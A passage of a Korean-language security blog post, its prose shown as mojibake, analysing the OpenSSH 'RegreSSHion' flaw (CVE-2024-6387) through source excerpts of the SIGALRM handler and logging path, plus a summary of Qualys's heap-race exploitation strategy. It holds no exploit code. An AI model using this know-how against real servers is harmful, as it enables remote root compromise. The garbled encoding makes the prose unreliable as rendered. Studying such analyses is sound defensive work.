---
title: CVE-2024-6387/CVE-2006-5051/CVE-2008-4109 - Analysis of Vulnerabilities in OpenSSH Server on a glibc-based Linux System
date: 2024-10-15 00:00:00 +00:00
modified: 2024-11-05 00:00:00 +00:00
tags: [1-day, exploit, OpenSSH, Linux]
description: CVE-2024-6387
---

<p align="center"><img src="/assets/img/CVE-2024-6387/openssh.gif"/></p>

# Intro

`CVE-2024-6387`ì€ 7ì›” 1ì¼ì— ê³µê°œëœ <a href="https://en.wikipedia.org/wiki/Qualys">Qualys</a>ì—ì„œ ë°œê²¬í•˜ê³  `OpenSSH` ë²„ì „ `9.8/9.8p1`ì—ì„œ íŒ¨ì¹˜ëœ ì·¨ì•½ì ì…ë‹ˆë‹¤. 
`CVE-2024-6387`ì€ `CVE-2006-5051`ì˜ ë³´ì•ˆ íšŒê·€(Security Regression)ë¡œ, íŒ¨ì¹˜ë˜ì—ˆë˜ ì·¨ì•½ì ì´ ì˜ëª»ëœ íŒ¨ì¹˜ë¡œ ì¸í•´ì„œ ì¬ë°œìƒí•œ ì¼€ì´ìŠ¤ì…ë‹ˆë‹¤.
`CVE-2006-5051`ì˜ ë³´ì•ˆ íšŒê·€ ì·¨ì•½ì ì´ê¸° ë•Œë¬¸ì— í•´ë‹¹ ì·¨ì•½ì ì€ "RegreSSHion"ì´ë€ ì´ë¦„ìœ¼ë¡œ ë¶ˆë¦¬ê³  ìˆìŠµë‹ˆë‹¤.

ë‘ ì·¨ì•½ì  ëª¨ë‘ `glibc`ë¥¼ ê¸°ë°˜ìœ¼ë¡œë‘” ë¦¬ëˆ…ìŠ¤ ì‹œìŠ¤í…œ í”„ë¡œê·¸ë¨ì¸ `OpenSSH`ì˜ ì„œë²„ í”„ë¡œê·¸ë¨ì— ì¡´ì¬í•˜ëŠ” `SIGALRM` ì‹œê·¸ë„ í•¸ë“¤ëŸ¬ì—ì„œ `Async-signal-unsafe` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°œìƒí•˜ê²Œ ë˜ëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ë¡œì¸í•´ ë ˆì´ìŠ¤ ì»¨ë””ì…˜ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡  í•´ë‹¹ ì·¨ì•½ì ìœ¼ë¡œ ì¸í•´ root ê¶Œí•œìœ¼ë¡œ ëŒ€ìƒ ì„œë²„ì— ëŒ€í•œ RCEê°€ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤.

ë³¸ ê¸€ì€ ì„ í–‰ ì—°êµ¬ë¥¼ ì§„í–‰í•˜ì‹  ë‹¤ë¥¸ ì—°êµ¬ì›ë¶„ë“¤ì˜ ê¸€ë“¤ì„ ì½ê³  ì œ ë‚˜ë¦„ ë¶„ì„ì„ ì§„í–‰í•˜ë©° ì·¨ì•½ì ì„ ê³µë¶€í•˜ë©° ì´í•´í•˜ê³  ì •ë¦¬í•´ë³¸ ê²°ê³¼ë¡œ ì‘ì„±í•˜ê²Œëœ ê¸€ì…ë‹ˆë‹¤. ë‚˜ë¦„ì˜ ë¶„ì„ì„ í•´ë´¤ì§€ë§Œ ë§ì§€ ì•ŠëŠ” ë¶€ë¶„ì´ ìˆì„ ìˆ˜ ìˆìœ¼ë©°, ë§Œì•½ ì´ë¥¼ ë°œê²¬í•˜ì…¨ì„ ì‹œ í”¼ë“œë°±í•´ì£¼ì‹œë©´ ì ê·¹ ë°˜ì˜í•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤. ì·¨ì•½ì  ë° `PoC` ë¶„ì„ì— ë§ì€ ë„ì›€ì´ëœ ìë£ŒëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

- <a href="https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt">https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt</a>

# Vuln

- CVE-ID : CVE-2024-6387
- CWE : <a href="http://cwe.mitre.org/data/definitions/362.html">CWE-362</a>, <a href="http://cwe.mitre.org/data/definitions/364.html">CWE-364</a>
- ì˜í–¥ ë°›ëŠ” ë²„ì „
<table>
    <tr>
        <th bgcolor="#00ff7f" style="color:black">ì·¨ì•½í•˜ì§€ ì•Šì€ ë²„ì „</th>
        <th bgcolor="#fa8072" style="color:black">ì·¨ì•½í•œ ë²„ì „</th>
    </tr>
</table>
<table>
    <tr>
        <th> Release </th>
        <th> Status </th>
        <th> Date </th>
    </tr>
    <tr>
        <td bgcolor="#fa8072" style="color:black"> < 4.4p1 </td>
        <td> CVE-2006-5051 ë˜ëŠ” CVE-2008-4109ì— ëŒ€í•œ íŒ¨ì¹˜ê°€ ì ìš©ë˜ì§€ ì•Šì•˜ì„ ê²½ìš° ì·¨ì•½ </td>
        <td> 2006ë…„ 9ì›” 27ì¼ ì´ì „ </td>
    </tr>
    <tr>
        <td bgcolor="#00ff7f" style="color:black"> 4.4p1 â‰¤ OpenSSH < 8.5p1 </td>
        <td> Mitigation ì ìš©ìœ¼ë¡œ ì·¨ì•½í•˜ì§€ ì•ŠìŒ </td>
        <td> 2006ë…„ 9ì›” 27ì¼ ~ 2021ë…„ 3ì›” 3ì¼ </td>
    </tr>
    <tr>
        <td bgcolor="#fa8072" style="color:black"> 8.5p1 â‰¤ OpenSSH < 9.8p1 </td>
        <td> ì·¨ì•½ì  ì¬ë°œ </td>
        <td> 2021ë…„ 3ì›” 3ì¼ ~ 2024ë…„ 7ì›” 1ì¼ </td>
    </tr>
    <tr> 
        <td bgcolor="#00ff7f" style="color:black"> â‰¥ 9.8p1 </td>
        <td> íšŒê·€ì— ëŒ€í•œ íŒ¨ì¹˜ ì ìš© </td>
        <td> 2024ë…„ 7ì›” 1ì¼ ì´í›„ </td>
    </tr>
</table>
Reference : <a href="https://en.wikipedia.org/wiki/RegreSSHion">https://en.wikipedia.org/wiki/RegreSSHion</a>

# RCA

`CVE-2024-6387`ì— ëŒ€í•´ ì•Œì•„ë³´ê¸° ì „ ë¨¼ì € `CVE-2006-5051`ì— ëŒ€í•´ì„œ ì•Œì•„ë³´ê³  í•´ë‹¹ ì·¨ì•½ì ì´ ì–´ë–»ê²Œ ì¬ë°œìƒí•˜ê²Œë˜ì—ˆëŠ”ì§€ ì•Œì•„ë´…ì‹œë‹¤.

## CVE-2006-5051

OpenSSHì˜ ì½”ë“œ ì¤‘ sshd.cì— ì¡´ì¬í•˜ëŠ” <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/sshd.c#L307">`grace_alarm_handler`</a>ëŠ” ì‚¬ìš©ìê°€ ë¡œê·¸ì¸ ìš”ì²­ì„ í•˜ê³ ë‚˜ì„œ ì¼ì • ì‹œê°„ì´ ì§€ë‚˜ë„ë¡ ë¡œê·¸ì¸ì„ í•˜ì§€ ì•Šìœ¼ë©´ ë°œìƒí•˜ëŠ” `SIGALRM` ì‹œê·¸ë„ì„ ì²˜ë¦¬í•˜ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤.

`grace_alarm_handler`ëŠ” sshdì˜ <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/sshd.c#L1685">`main` í•¨ìˆ˜ì—ì„œ ì„¤ì •</a>ë˜ê³  `sshd_config` ì§€ì‹œì–´(LoginGraceTime)ë¡œ ì„¤ì •ëœ ì¼ì • ì‹œê°„ì´ ì§€ë‚˜ê²Œë˜ì—ˆì„ ë•Œ ë°œìƒí•˜ëŠ” `SIGALRM` ì‹œê·¸ë„ì„ ì²˜ë¦¬í•˜ê¸° ìœ„í•´ í˜¸ì¶œë©ë‹ˆë‹¤.

ë‹¤ìŒê³¼ ê°™ì´ ë¡œê·¸ì¸ ì‹œë„ í›„ `LoginGraceTime`ì´ ì„¤ì •ë˜ì–´ìˆë‹¤ë©´ ì¸ì¦ ì‹œê°„ ì´ˆê³¼(`SIGALRM`)ì— ì˜í•´ `grace_alarm_handler`ê°€ í˜¸ì¶œë©ë‹ˆë‹¤.

ì˜ìƒì— ë‚˜ì˜¨ OpenSSH ë²„ì „ì€ `9.2p`ë¡œ `grace_alarm_handler`ì˜ ì‘ë™ì„ ë³´ì—¬ë“œë¦¬ê¸° ìœ„í•´ ì‚¬ìš©ë˜ì—ˆìŠµë‹ˆë‹¤.

<video width="100%" height="100%" controls>
  <source src="/assets/videos/CVE-2024-6387/sigalarm_grace.mkv" type="video/webm">
</video>

`OpenSSH 4.3` ë²„ì „ì˜ <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/sshd.c#L307">`grace_alarm_handler`</a>ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì‘ì„±ë˜ì–´ìˆìŠµë‹ˆë‹¤.
```c
/*
 * Signal handler for the alarm after the login grace period has expired.
 */
static void
grace_alarm_handler(int sig)
{
	/* XXX no idea how fix this signal handler */

	if (use_privsep && pmonitor != NULL && pmonitor->m_pid > 0)
		kill(pmonitor->m_pid, SIGALRM);

	/* Log error and exit. */
	fatal("Timeout before authentication for %s", get_remote_ipaddr());
}
````

ë¡œê¹…ì„ ìœ„í•´ `fatal` í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ëª¨ìŠµì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. `fatal` í•¨ìˆ˜ëŠ” <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/fatal.c">fatal.c</a>ì— ë‹¤ìŒê³¼ ê°™ì´ ì‘ì„±ë˜ì–´ìˆìŠµë‹ˆë‹¤.

```c
void
fatal(const char *fmt,...)
{
	va_list args;
	va_start(args, fmt);
	do_log(SYSLOG_LEVEL_FATAL, fmt, args);
	va_end(args);
	cleanup_exit(255);
}
```

`fatal` í•¨ìˆ˜ëŠ” ë‹¤ì‹œ ë¡œê¹…ì„ ìœ„í•´ `log.c`ì— ìœ„ì¹˜í•œ <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/log.c#L286">`do_log`</a> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. ì´ì œ `do_log` ì½”ë“œë¥¼ í™•ì¸í•´ë´…ì‹œë‹¤.

```c
void
do_log(LogLevel level, const char *fmt, va_list args)
{
...
		syslog(pri, "%.500s", fmtbuf);
...
	}
}
```

í•´ë‹¹ ì½”ë“œì—ì„œ `syslog`ë¥¼ í˜¸ì¶œí•˜ëŠ” ëª¨ìŠµì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë•Œ `glibc`ì˜ `syslog`ëŠ” ë©”ëª¨ë¦¬ ë²„í¼ ìŠ¤íŠ¸ë¦¼ì„ ìƒì„±í•˜ê¸° ìœ„í•´ì„œ `malloc`ì„ í˜¸ì¶œí•˜ê³  í•¨ìˆ˜ì˜ ëì—ì„œëŠ” í•´ë‹¹ ë©”ëª¨ë¦¬ë¥¼ ì •ë¦¬í•˜ê¸° ìœ„í•´ì„œ `free`í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.
ì´ë•Œì˜ <a href="https://stackoverflow.com/questions/3941271/why-are-malloc-and-printf-said-as-non-reentrant">`malloc`</a>ê³¼ `free`ëŠ” ë¹„ë™ê¸° ì‹œê·¸ë„ì— ì•ˆì „í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ì‹œê·¸ë„ ì²˜ë¦¬ í•¨ìˆ˜ì—ì„œëŠ” í˜¸ì¶œë˜ì–´ì„  ì•ˆë˜ì§€ë§Œ `syslog`ì˜ í˜¸ì¶œë¡œ ì¸í•´ì„œ ì·¨ì•½ì ì´ ë°œìƒí•œ ìƒí™©ì…ë‹ˆë‹¤.

## Async-signal-safe function

`Async-signal-safe` í•¨ìˆ˜ë€ ì‹œê·¸ë„ í•¸ë“¤ëŸ¬ ë‚´ì—ì„œ ì•ˆì „í•˜ê²Œ í˜¸ì¶œí•  ìˆ˜ ìˆëŠ” í•¨ìˆ˜ë¥¼ ëœ»í•©ë‹ˆë‹¤.

ì‹œê·¸ë„ í•¸ë“¤ëŸ¬ì—ì„œ í˜¸ì¶œí•˜ëŠ” í•¨ìˆ˜ê°€ `async signal safety`(ë¹„ë™ê¸° ì‹œê·¸ë„ ì•ˆì „ì„±)ì´ ì—†ì„ ê²½ìš° ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- <a href="https://stackoverflow.com/questions/3941271/why-are-malloc-and-printf-said-as-non-reentrant">https://stackoverflow.com/questions/3941271/why-are-malloc-and-printf-said-as-non-reentrant</a>

`CVE-2006-5051`ì€ `async-signal-unsafe` í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ì„œ ë°œìƒí•©ë‹ˆë‹¤. ë°”ë¡œ ì§ì ‘ì ì¸ í˜¸ì¶œì€ ì•„ë‹ˆë©° ìœ„ì—ì„œ ì‚´í´ë³¸ëŒ€ë¡œ ë‹¤ìŒê³¼ ê°™ì€ ê³¼ì •ìœ¼ë¡œ `async-signal-unsafe` í•¨ìˆ˜ê°€ í˜¸ì¶œë©ë‹ˆë‹¤.

<p align="center"><img src="/assets/img/CVE-2024-6387/function_call_diagram.png"/></p>

ì´ì™€ ê°™ì€ `SIGALRM` í•¸ë“¤ëŸ¬ì˜ í—ˆì ì„ ì´ìš©í•´ `malloc/free` í•¨ìˆ˜ ì²˜ë¦¬ ì¤‘ íŠ¹ì • ì§€ì ì—ì„œì˜ ì²˜ë¦¬ë¥¼ ì¤‘ë‹¨ì‹œí‚¤ê³  `malloc/free`ì— ì¬ì§„ì…í•˜ì—¬ ìµìŠ¤í”Œë¡œì‡ì„ ì„±ê³µì‹œí‚µë‹ˆë‹¤.


## CVE-2006-5051 Patch (Incorrect fix)

ìœ„ì—ì„œ ì•Œì•„ë³¸ ì·¨ì•½ì ì€ `CVE-2006-5051` íŒ¨ì¹˜ì— ì˜í•´ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜ì •ë˜ì—ˆìŠµë‹ˆë‹¤.

`OpenSSH 4.4` ë²„ì „ì˜ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

ë¨¼ì € sshd.cì—ì„œì˜ `grace_alarm_handler`ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë³€ê²½ë˜ì—ˆìŠµë‹ˆë‹¤.

4.3p2
<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/grace_alarm_handler_4.3p2.png"/></p>

4.4
<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/grace_alarm_handler_4.4.png"/></p>

4.4ì—ì„  `sigdie`ë¥¼ í˜¸ì¶œí•˜ëŠ” í˜•íƒœë¡œ ë°”ë€Œì—ˆìŠµë‹ˆë‹¤. `sigdie`ëŠ” ì´ì „ ë²„ì „ê³¼ ë™ì¼í•˜ê²Œ `do_log`ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.
```c
void
sigdie(const char *fmt,...)
{
	va_list args;

	va_start(args, fmt);
	do_log(SYSLOG_LEVEL_FATAL, fmt, args);
	va_end(args);
	_exit(1);
}
```

í•˜ì§€ë§Œ `do_log`ì—ì„œ ì—¬ì „íˆ `syslog`ë¥¼ í˜¸ì¶œí•˜ëŠ” ëª¨ìŠµì´ ë³´ì…ë‹ˆë‹¤.
```c
...

void
do_log(LogLevel level, const char *fmt, va_list args)
{
...
		syslog(pri, "%.500s", fmtbuf);
...
}
```

ì˜ëª»ëœ íŒ¨ì¹˜ê°€ ì´ë£¨ì–´ì¡Œê³  í•´ë‹¹ ì·¨ì•½ì ì€ ì—¬ì „íˆ ì¡´ì¬í•˜ëŠ” ìƒíƒœê°€ ë©ë‹ˆë‹¤.

## CVE-2008-4109 Patch

ì•ì„œ ì•Œì•„ë³¸ ì·¨ì•½ì ì€ <a href="https://nvd.nist.gov/vuln/detail/CVE-2008-4109">`CVE-2008-4109`</a> íŒ¨ì¹˜ì—ì„œ ë¹„ë¡œì†Œ ìˆ˜ì •ë©ë‹ˆë‹¤.

> A certain Debian patch for OpenSSH before 4.3p2-9etch3 on etch; before 4.6p1-1 on sid and lenny; and on other distributions such as SUSE uses functions that are not async-signal-safe in the signal handler for login timeouts, which allows remote attackers to cause a denial of service (connection slot exhaustion) via multiple login attempts. NOTE: this issue exists because of an incorrect fix for CVE-2006-5051.

OpenSSH 4.5p1 `grace_alarm_handler`
```c
/*
 * Signal handler for the alarm after the login grace period has expired.
 */
/*ARGSUSED*/
static void
grace_alarm_handler(int sig)
{
	if (use_privsep && pmonitor != NULL && pmonitor->m_pid > 0)
		kill(pmonitor->m_pid, SIGALRM);

	/* Log error and exit. */
	sigdie("Timeout before authentication for %s", get_remote_ipaddr());
}
```

OpenSSH 4.5p1 `sigdie`
```c
void
sigdie(const char *fmt,...)
{
#ifdef DO_LOG_SAFE_IN_SIGHAND
	va_list args;

	va_start(args, fmt);
	do_log(SYSLOG_LEVEL_FATAL, fmt, args);
	va_end(args);
#endif
	_exit(1);
}
```
`grace_alarm_handler`ì—ì„œ í˜¸ì¶œë˜ëŠ” `sigdie`ì—ëŠ” ì „ì²˜ë¦¬ ì½”ë“œê°€ ì‚½ì…ë˜ì–´ `DO_LOG_SAFE_IN_SIGHAND`ë¥¼ ì •ì˜í•˜ì§€ ì•ŠëŠ”ì´ìƒ
`do_log`ë¥¼ í˜¸ì¶œí•˜ëŠ” ì¼ì€ ì—†ì–´ì¡ŒìŠµë‹ˆë‹¤.

## CVE-2024-6387 (RegreSSHion)

ì•ì„œ ì‚´í´ë³¸ ì·¨ì•½ì ì¸ `CVE-2006-5051`ê³¼ `CVE-2008-4109`ëŠ” ìœ„ì—ì„œ ì ìš©ëœ `#ifdef DO_LOG_SAFE_IN_SIGHAND`ê°€ ì‹¤ìˆ˜ë¡œ ì œê±°ë˜ì–´ <a href="https://github.com/openssh/openssh-portable/commit/752250c">`commit 752250c`</a>(OpenSSH 8.5p1)ì— ì˜í•´ì„œ ë¶€í™œí•˜ê²Œë©ë‹ˆë‹¤.

ì½”ë“œê°€ ì–´ë–»ê²Œ ë°”ë€Œì—ˆëŠ”ì§€ í™•ì¸í•´ë´…ì‹œë‹¤.

grace_alarm_handler
```c
/*
 * Signal handler for the alarm after the login grace period has expired.
 */
/*ARGSUSED*/
static void
grace_alarm_handler(int sig)
{
	if (use_privsep && pmonitor != NULL && pmonitor->m_pid > 0)
		kill(pmonitor->m_pid, SIGALRM);

	/*
	 * Try to kill any processes that we have spawned, E.g. authorized
	 * keys command helpers.
	 */
	if (getpgid(0) == getpid()) {
		ssh_signal(SIGTERM, SIG_IGN);
		kill(0, SIGTERM);
	}

	/* XXX pre-format ipaddr/port so we don't need to access active_state */
	/* Log error and exit. */
	sigdie("Timeout before authentication for %s port %d",
	    ssh_remote_ipaddr(the_active_state),
	    ssh_remote_port(the_active_state));
}
```

ì—¬ê¸°ì„œ `sigdie`ëŠ” ë§¤í¬ë¡œë¡œ `sshsigdie`ë¡œ í™•ì¥ë©ë‹ˆë‹¤.
```c
#define sigdie(...)		sshsigdie(__FILE__, __func__, __LINE__, 0, SYSLOG_LEVEL_ERROR, NULL, __VA_ARGS__)
```

`sshsigdie`ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì •ì˜ë˜ì–´ìˆìŠµë‹ˆë‹¤. ì´ë•Œ `sshsigdie`ëŠ” `sshlogv`ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.
```c
void
sshsigdie(const char *file, const char *func, int line, int showfunc,
    LogLevel level, const char *suffix, const char *fmt, ...)
{
	va_list args;

	va_start(args, fmt);
	sshlogv(file, func, line, showfunc, SYSLOG_LEVEL_FATAL,
	    suffix, fmt, args);
	va_end(args);
	_exit(1);
}
```

ê²°ê³¼ì ìœ¼ë¡œ `sshlogv`ëŠ” ê·¸ì „ì— íŒ¨ì¹˜ë¡œ í˜¸ì¶œë˜ì§€ ì•Šê²Œí–ˆë˜ `do_log`ë¥¼ ë‹¤ì‹œ í˜¸ì¶œí•˜ê²Œë©ë‹ˆë‹¤.
```c
void
sshlogv(const char *file, const char *func, int line, int showfunc,
    LogLevel level, const char *suffix, const char *fmt, va_list args)
{
	char tag[128], fmt2[MSGBUFSIZ + 128];
	int forced = 0;
	const char *cp;
	size_t i;

	snprintf(tag, sizeof(tag), "%.48s:%.48s():%d",
	    (cp = strrchr(file, '/')) == NULL ? file : cp + 1, func, line);
	for (i = 0; i < nlog_verbose; i++) {
		if (match_pattern_list(tag, log_verbose[i], 0) == 1) {
			forced = 1;
			break;
		}
	}

	if (log_handler == NULL && forced)
		snprintf(fmt2, sizeof(fmt2), "%s: %s", tag, fmt);
	else if (showfunc)
		snprintf(fmt2, sizeof(fmt2), "%s: %s", func, fmt);
	else
		strlcpy(fmt2, fmt, sizeof(fmt2));

	do_log(file, func, line, level, forced, suffix, fmt2, args);
}
```
`do_log`ëŠ” ì—¬ì „íˆ `syslog`ë¥¼ í˜¸ì¶œí•˜ê³  ìˆìœ¼ë©° `glibc`ì˜ `syslog`ëŠ” ì—¬ì „íˆ ë¹„ë™ê¸° ì‹œê·¸ë„ì— ëŒ€í•´ ì•ˆì „í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ë³´ì•ˆ íšŒê·€ê°€ ë°œìƒí•©ë‹ˆë‹¤.
```c
static void
do_log(const char *file, const char *func, int line, LogLevel level,
    int force, const char *suffix, const char *fmt, va_list args)
{
...
		syslog(pri, "%.500s", fmtbuf);
...
}
```
ì´ë¡œì¸í•´ í•´ë‹¹ íŒ¨ì¹˜ê°€ ë„ì…ëœ `8.5p1`ë¶€í„° `9.8p1` íŒ¨ì¹˜ê°€ ì ìš©ë˜ê¸° ì´ì „ê¹Œì§€ `glibc-based` ë¦¬ëˆ…ìŠ¤ ì‹œìŠ¤í…œì—ì„œ ì·¨ì•½ì ì´ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.

<p align="center"><img src="/assets/img/CVE-2024-6387/regresshion_attack.png"/><a href="https://upload.wikimedia.org/wikipedia/commons/8/83/Resultant.png">https://upload.wikimedia.org/wikipedia/commons/8/83/Resultant.png</a></p>


## Exploit

ë³¸ ì·¨ì•½ì ì„ ì œë³´í•œ QualysëŠ” ìœ„ ì·¨ì•½ì (CVE-2024-6387)ì˜ ì•…ìš©ë°©ë²•ì„ 32bit glibcê¸°ë°˜ì˜ ë¦¬ëˆ…ìŠ¤ì—ì„œ ì…ì¦í–ˆìŠµë‹ˆë‹¤. ë˜í•œ ë‹¤ë¥¸ ë²„ì „ì—ì„œë„ ì•…ìš© ê°€ëŠ¥ ì§€ì ì„ ì°¾ì•„ íŠ¹ì • ë²„ì „ì— ëŒ€í•œ ì•…ìš© ê°€ëŠ¥ì„±ì„ ì—°êµ¬ë¥¼ ì§„í–‰í–ˆìŠµë‹ˆë‹¤.

ì—°êµ¬ ê°œìš”ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

### SSH-2.0-OpenSSH_3.4p1 Debian 1:3.4p1-1.woody.3 (Debian 3.0r6, from 2005)

`DSA`ì˜ ê³µê°œ í‚¤ íŒŒì‹± ì§€ì ì—ì„œ í˜¸ì¶œë˜ëŠ” `free`ë¥¼ ì·¨ì•½ì ì„ ì´ìš©í•´ ì¤‘ê°„ì— ì²˜ë¦¬ë¥¼ ì¤‘ë‹¨ì‹œí‚¤ê³ ,
ì™„ì „í•œ ì²˜ë¦¬ê°€ ì´ë£¨ì–´ì§€ì§€ ì•Šì€ `heap chunk`ì— ëŒ€í•´ `grace_alarm_handler`ì— ì˜í•´ í˜¸ì¶œë˜ëŠ” `free`ë¥¼ í†µí•´
ê³µê²©ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.

í•´ë‹¹ ê³µê²©ì„ ì„±ê³µì‹œí‚¤ê¸°ìœ„í•´ 600ì´ˆì˜ ë¡œê·¸ì¸ ìœ ì˜ˆ ì‹œê°„ ë™ì•ˆ 10ê°œì˜ ì—°ê²°(MaxStartups)ì„ ìˆ˜ìš©í•  ê²½ìš° ì•½ 10,000ë²ˆì˜ ì‹œë„ê°€ í•„ìš”í•˜ë©° ì›ê²© ë£¨íŠ¸ ì‰˜ì„ ì–»ê¸° ìœ„í•´ í‰ê· ì ìœ¼ë¡œ ì•½ 1ì£¼ì¼ ì •ë„ê°€ ì†Œìš”ë©ë‹ˆë‹¤.

### SSH-2.0-OpenSSH_4.2p1 Debian-7ubuntu3 (Ubuntu 6.06.1, from 2006)

í•´ë‹¹ ë²„ì „ì˜ ì—°êµ¬ì—ì„  `CVE-2006-5051`ì—ì„œ ì–¸ê¸‰ëœ `GSSAPI`ë¥¼ `GSSAPI` ê¸°ëŠ¥ì€ ê¸°ë³¸ì ìœ¼ë¡œ í™œì„±í™”ë˜ì–´ìˆì§€ ì•Šê¸° ë•Œë¬¸ì—
ì·¨ì•½ì ì„ ì•…ìš©í•  í¬ì¸íŠ¸ë¡œ ì‚¬ìš©í•˜ì§€ ì•Šê³  ê¸°ë³¸ì ìœ¼ë¡œ í™œì„±í™”ëœ `PAM` ê¸°ëŠ¥ì„ ì´ìš©í•©ë‹ˆë‹¤.

í•´ë‹¹ ê³µê²©ì„ ì„±ê³µì‹œí‚¤ê¸°ìœ„í•´ 120ì´ˆì˜ ë¡œê·¸ì¸ ìœ ì˜ˆ ì‹œê°„ ë™ì•ˆ 10ê°œì˜ ì—°ê²°(MaxStartups)ì„ ìˆ˜ìš©í•  ê²½ìš° ì•½ 10,000ë²ˆì˜ ì‹œë„ê°€ í•„ìš”í•˜ë©° ì›ê²© ë£¨íŠ¸ ì‰˜ì„ ì–»ê¸° ìœ„í•´ ì•½ 1~2ì¼ ì •ë„ê°€ ì†Œìš”ë©ë‹ˆë‹¤.

### SSH-2.0-OpenSSH_9.2p1 Debian-2.+deb12u2 (Debian 12.5.0 from 2024)

> ğŸ§ª ì•„ë˜ ì„œìˆ ëœ Exploitì€ `_vtable_offset`ì„ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê²½ìš° `_IO_wfile_underflow`ì˜ ìœ ë„ê°€ ë¶ˆê°€ëŠ¥í•˜ê¸°ë•Œë¬¸ì— glibc 32bitì—ì„œë§Œ ìœ íš¨í•©ë‹ˆë‹¤.

<details>
<summary>â‰ï¸</summary>
<div markdown="1">
ë‹¤ìŒ glibc-2.36ì˜ ì†ŒìŠ¤ ì½”ë“œì˜ ì£¼ì„ì„ í™•ì¸í•´ë´…ì‹œë‹¤.

libioP.h
```c
/* Setting this macro to 1 enables the use of the _vtable_offset bias
   in _IO_JUMPS_FUNCS, below.  This is only needed for new-format
   _IO_FILE in libc that must support old binaries (see oldfileops.c).  */
#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1) && !defined _IO_USE_OLD_IO_FILE
# define _IO_JUMPS_OFFSET 1
#else
# define _IO_JUMPS_OFFSET 0
#endif
```

ìœ„ì™€ ê°™ì€ ê²½ìš° ì»´íŒŒì¼ ì„¤ì •ì— ë”°ë¼ `_IO_JUMPS_OFFSET`ì„ `1`ë¡œ ë§Œë“¤ì–´ í™œì„±í™”í•˜ê±°ë‚˜ `0`ìœ¼ë¡œ ë§Œë“¤ì–´ ì¼ë¶€ ë§¤í¬ë¡œë¥¼ ë‹¤ë¥´ê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ì—ë”°ë¼ ë‹¤ìŒê³¼ ê°™ì€ ë§¤í¬ë¡œì— ì°¨ì´ê°€ ìƒê¹ë‹ˆë‹¤.

```c
#if _IO_JUMPS_OFFSET
# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
			     + (THIS)->_vtable_offset)))
# define _IO_JUMPS_FUNC_UPDATE(THIS, VTABLE)				\
  (*(const struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
				  + (THIS)->_vtable_offset) = (VTABLE))
# define _IO_vtable_offset(THIS) (THIS)->_vtable_offset
#else
# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
# define _IO_JUMPS_FUNC_UPDATE(THIS, VTABLE) \
  (_IO_JUMPS_FILE_plus (THIS) = (VTABLE))
# define _IO_vtable_offset(THIS) 0
#endif
```

ìœ„ì—ì„œ ë³¸ _IO_JUMPS_OFFSETì„ 0ìœ¼ë¡œ ë§Œë“ ë‹¤ë©´ ì„¤ì •ì— ì˜í•´ `_IO_JUMPS_FUNC`ì—ì„œ `_vtable_offset` í•„ë“œë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê²Œë˜ê³ 
ì´ë¡œì¸í•´ì„œ ê³µê²©ì´ í†µí•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŠ” ì› ì—°êµ¬ê¸€ì—ë„ ë‚˜ì™€ìˆìœ¼ë©° ë”°ë¼ì„œ ì•„ë˜ì— ì„¤ëª…í•˜ëŠ” ê³µê²©ì€ i386 glibcì—ë§Œ í•´ë‹¹í•˜ê²Œë©ë‹ˆë‹¤.

> Eventually, we devised the following technique (which seems to be
> specific to the i386 glibc -- the amd64 glibc does not seem to use
> _vtable_offset at all):

-- [ì ‘ì€ê¸€ì˜ ëì…ë‹ˆë‹¤] -- 
</div>
</details>

